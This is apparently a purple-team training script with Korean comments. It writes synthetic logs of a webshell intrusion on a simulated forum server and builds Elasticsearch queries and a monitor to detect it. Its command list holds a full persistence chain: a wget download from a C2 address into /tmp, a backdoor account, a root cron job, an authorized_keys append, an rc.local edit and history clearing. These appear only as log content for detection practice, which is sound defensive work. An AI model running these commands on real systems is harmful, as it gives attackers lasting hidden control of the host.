#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""R04 실행·지속성 — 업로드 이미지 수천 장 속 PHP 한 개, cron 실행 수만 건 속 /tmp 스크립트 하나.

Red(로그로만 재현) — 공격자 W, 표적 mediforum(10.20.40.85)
  1) 이미지로 위장한 웹셸 업로드(FIM 554) → 2) 웹셸로 명령 실행(웹 GET + auditd: apache2 → sh)
  3) 지속성: 계정 생성(5902)·/etc/passwd·shadow 변경·cron.d 추가·root authorized_keys·rc.local
  4) cron 이 10분마다 /tmp/.x/update.sh 실행 (auditd)
Blue: 업로드 FIM 확장자 분포 → 부모-자식 프로세스 쌍 → 업로드 경로 PHP 호출 IP → /etc·/root 변경 → 주기 실행 → 타임라인
"""
import purplelab as P

ROUND, TITLE, SEED = "r04", "실행·지속성 — 수천 건 속 한 건", 404
SHELL = "/var/www/mediforum/uploads/{ym}/av_7731.php"
CMDS = ["id", "uname -a", "cat /etc/passwd", "ls -la /var/www/mediforum", "ps aux", "netstat -tnlp", "cat /var/www/mediforum/config.yml",
        "find / -perm -4000 -type f 2>/dev/null", "crontab -l", "wget -q http://{c2}/u.sh -O /tmp/.x/update.sh",
        "chmod +x /tmp/.x/update.sh", "sudo -n useradd -m -s /bin/bash sysupdate", "sudo -n sh -c 'echo sysupdate:x | chpasswd'",
        "echo '*/10 * * * * root /tmp/.x/update.sh' | sudo -n tee /etc/cron.d/sysupdate", "mkdir -p /root/.ssh",
        "sudo -n sh -c 'cat /tmp/k.pub >> /root/.ssh/authorized_keys'", "sudo -n sed -i 's/^exit 0/\\/tmp\\/.x\\/update.sh \\&\\nexit 0/' /etc/rc.local",
        "history -c"]


def attack(S):
    S.opts["audit"] = True
    W = S.ext_ip("Vietnam")
    c2 = S.ext_ip("Netherlands")
    S.ips.update(W=W, C2=c2)
    ua = P.UA_LIST[2]
    S.ips["shell_day"] = min(40, P.DAYS - 1)
    t = S.at(S.ips["shell_day"], 22, 8, 10)
    ym = P.time.strftime("%Y%m", P.time.gmtime(t + 32400))
    shell = SHELL.format(ym=ym)
    S.ips["shell"] = shell
    S.add(P.web(t, "mediforum", W, "POST", "/upload", 200, 412, 280, ua))
    S.add(P.fim(t + 0.4, "mediforum", shell, "added", "www-data"))
    url_shell = shell.replace("/var/www/mediforum", "")
    for c in CMDS:
        t += S.rnd.uniform(25, 240)
        cmd = c.format(c2=c2)
        q = "?c=" + cmd.replace(" ", "+").replace("/", "%2F").replace("'", "%27").replace("|", "%7C").replace("*", "%2A")
        S.add(P.web(t, "mediforum", W, "GET", url_shell + q, 200, S.rnd.randint(60, 4000), S.rnd.randint(20, 400), ua))
        S.add(P.audit(t + 0.05, "mediforum", "www-data", "/bin/sh", "sh -c " + cmd, "/usr/sbin/apache2"))
        if "useradd" in cmd:
            S.add(P.useradd(t + 0.2, "mediforum", "sysupdate"))
            S.add(P.fim(t + 0.6, "mediforum", "/etc/passwd", "modified"))
            S.add(P.fim(t + 0.7, "mediforum", "/etc/group", "modified"))
        if "chpasswd" in cmd:
            S.add(P.fim(t + 0.4, "mediforum", "/etc/shadow", "modified"))
        if "cron.d" in cmd:
            S.add(P.fim(t + 0.3, "mediforum", "/etc/cron.d/sysupdate", "added"))
            S.ips["cron_t"] = t
        if "authorized_keys" in cmd:
            S.add(P.fim(t + 0.3, "mediforum", "/root/.ssh/authorized_keys", "modified"))
        if "rc.local" in cmd:
            S.add(P.fim(t + 0.3, "mediforum", "/etc/rc.local", "modified"))
        if "u.sh" in cmd:
            S.add(P.flow(t + 0.1, P.IP_OF["mediforum"], c2, 80, 380, 18_422, "http", 1))
    # 지속성 동작: 매시 정각 cron 이 /tmp/.x/update.sh 실행 (설치 시점 이후 기간 끝까지)
    k = int(S.ips["cron_t"] // 3600 + 1) * 3600
    while k < S.anchor:
        S.add(P.audit(k + S.rnd.uniform(0.5, 2.5), "mediforum", "root", "/tmp/.x/update.sh", "/bin/sh /tmp/.x/update.sh", "/usr/sbin/cron"))
        k += 3600
    # 장기 웹셸 사용: 설치 후 기간 끝까지 실제 로그 재방문 패턴으로 드문드문 명령 1~3개
    for t0 in S.visits(S.ips["shell_day"] - 1, 1):
        for tt in S.session_times(t0, S.rnd.randint(1, 3)):
            cmd = S.rnd.choice(["id", "ls -la /var/www/mediforum/uploads", "cat /var/www/mediforum/config.yml", "ps aux",
                                "tail -n 50 /var/log/apache2/mediforum_access.log", "df -h", "who"])
            q = "?c=" + cmd.replace(" ", "+").replace("/", "%2F")
            S.add(P.web(tt, "mediforum", W, "GET", url_shell + q, 200, S.rnd.randint(60, 4000), S.rnd.randint(20, 400), ua))
            S.add(P.audit(tt + 0.05, "mediforum", "www-data", "/bin/sh", "sh -c " + cmd, "/usr/sbin/apache2"))


S0 = P.Scenario(0, SEED)
attack(S0)
W = S0.ips["W"]

QUERIES = [
    P.Q("Q1", "파일 추가(FIM 554) — 업로드 폴더 확장자별",
        {"size": 0, "query": {"bool": {"filter": [{"term": {"rule.id": "554"}}, {"wildcard": {"syscheck.path": "/var/www/*/uploads/*"}}]}},
         "aggs": {"ext": {"filters": {"filters": {
             "1_jpg": {"wildcard": {"syscheck.path": "*.jpg"}}, "2_png": {"wildcard": {"syscheck.path": "*.png"}},
             "3_pdf": {"wildcard": {"syscheck.path": "*.pdf"}}, "4_php": {"wildcard": {"syscheck.path": "*.php"}}}}}}},
        path=["ext"], cols=["key", "doc_count"]),
    P.Q("Q2", "auditd — 부모 프로세스 × 실행 파일 쌍",
        {"size": 0, "query": {"term": {"decoder.name": "auditd"}},
         "aggs": {"parent": {"terms": {"field": "data.audit.parent", "size": 5},
                             "aggs": {"exe": {"terms": {"field": "data.audit.exe", "size": 4}}}}}},
        path=["parent", "exe"], cols=["^key", "key", "doc_count"]),
    P.Q("Q3", "업로드 폴더의 .php 를 호출한 IP",
        {"size": 0, "query": {"bool": {"filter": [{"term": {"decoder.name": "web-accesslog"}},
                                                   {"wildcard": {"data.url": "/uploads/*.php*"}}]}},
         "aggs": {"by_ip": {"terms": {"field": "data.srcip", "size": 5},
                            "aggs": {"urls": {"cardinality": {"field": "data.url"}}}}}},
        path=["by_ip"], cols=["key", "doc_count", "urls.value"]),
    P.Q("Q4", "/etc · /root 아래 파일 변경(FIM)과 계정 생성",
        {"size": 0, "query": {"bool": {"should": [{"prefix": {"syscheck.path": "/etc/"}}, {"prefix": {"syscheck.path": "/root/"}},
                                                  {"term": {"rule.id": "5902"}}]}},
         "aggs": {"by_agent": {"terms": {"field": "agent.name", "size": 3},
                               "aggs": {"what": {"terms": {"field": "rule.description", "size": 4}}}}}},
        path=["by_agent", "what"], cols=["^key", "key", "doc_count"]),
    P.Q("Q5", "cron 이 실행한 파일 — 건수와 처음·마지막 시각",
        {"size": 0, "query": {"term": {"data.audit.parent": "/usr/sbin/cron"}},
         "aggs": {"exe": {"terms": {"field": "data.audit.exe", "size": 3},
                          "aggs": {"first": {"min": {"field": "timestamp"}}, "last": {"max": {"field": "timestamp"}},
                                   "hosts": {"cardinality": {"field": "agent.name"}}}}}},
        path=["exe"], cols=["key", "doc_count", "hosts.value", "first.value|ts", "last.value|ts"]),
    P.Q("Q7", "웹셸 호출 IP 의 주별 접근 횟수 (장기 잠복)",
        {"size": 0, "query": {"bool": {"filter": [{"term": {"decoder.name": "web-accesslog"}}, {"wildcard": {"data.url": "/uploads/*.php*"}}]}},
         "aggs": {"w": {"date_histogram": {"field": "timestamp", "fixed_interval": "7d", "time_zone": "+09:00", "format": "yyyy-MM-dd", "min_doc_count": 1}}}},
        path=["w"], cols=["key_as_string", "doc_count"]),
    P.Q("Q6", "mediforum 침투 첫날 타임라인 — 10분 단위 (웹셸 호출·auditd·FIM·계정)",
        {"size": 0, "query": {"bool": {"filter": [{"term": {"agent.name": "mediforum"}}],
                                       "should": [{"term": {"data.srcip": W}}, {"term": {"data.audit.parent": "/usr/sbin/apache2"}},
                                                  {"prefix": {"syscheck.path": "/etc/"}}, {"prefix": {"syscheck.path": "/root/"}},
                                                  {"wildcard": {"syscheck.path": "*.php"}}, {"term": {"rule.id": "5902"}}],
                                       "minimum_should_match": 1}},
         "aggs": {"t": {"date_histogram": {"field": "timestamp", "fixed_interval": "10m", "time_zone": "+09:00",
                                           "format": "MM-dd HH:mm", "min_doc_count": 1},
                        "aggs": {"what": {"terms": {"field": "decoder.name", "size": 4}}}}}},
        path=["t", "what"], cols=["^key_as_string", "key", "doc_count"], head=14),
]
QUERIES.sort(key=lambda q: q.id)

MON = P.Q("MON", "웹서버 프로세스(apache2)가 셸을 실행한 호스트",
          {"size": 0, "query": {"bool": {"filter": [{"term": {"data.audit.parent": "/usr/sbin/apache2"}},
                                                    {"terms": {"data.audit.exe": ["/bin/sh", "/bin/bash", "/usr/bin/bash", "/bin/dash"]}}]}},
           "aggs": {"by_agent": {"terms": {"field": "agent.name", "size": 20},
                                 "aggs": {"hit": {"bucket_selector": {"buckets_path": {"c": "_count"}, "script": "params.c >= 1"}}}}}},
          path=["by_agent"], cols=["key", "doc_count"],
          trigger="ctx.results[0].aggregations.by_agent.buckets.size() > 0")

if __name__ == "__main__":
    P.main(ROUND, TITLE, attack, QUERIES, SEED, monitor=MON)
